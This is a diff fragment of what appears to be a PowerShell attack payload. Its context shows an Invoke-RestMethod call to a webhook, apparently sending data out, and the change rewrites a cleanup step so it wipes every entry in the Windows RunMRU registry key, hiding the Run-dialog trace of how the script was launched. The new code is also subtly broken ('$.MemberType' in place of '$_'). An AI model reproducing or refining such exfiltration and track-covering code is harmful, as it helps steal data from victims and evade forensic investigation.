@@ -35,18 +35,17 @@ Invoke-RestMethod -Uri $WEBHOOK `
 }
 $path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
 
+
 $reg = Get-ItemProperty -Path $path
-$lastKey = $reg.MRUList.Substring(0,1)
+$keys = $reg.PSObject.Properties | Where-Object { $.MemberType -eq 'NoteProperty' -and $.Name -ne 'MRUList' } | Select-Object -ExpandProperty Name
 
-Remove-ItemProperty -Path $path -Name $lastKey -ErrorAction SilentlyContinue
-$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
-$reg = Get-ItemProperty $path
-
-foreach ($p in $reg.PSObject.Properties) {
-    if ($p.Value -match '$WEBHOOK') {
-        Remove-ItemProperty -Path $path -Name $p.Name -ErrorAction SilentlyContinue
-    }
+foreach ($key in $keys) {
+    Remove-ItemProperty -Path $path -Name $key -ErrorAction SilentlyContinue
 }
+
+
+Set-ItemProperty -Path $path -Name MRUList -Value ""
+
 
 
 
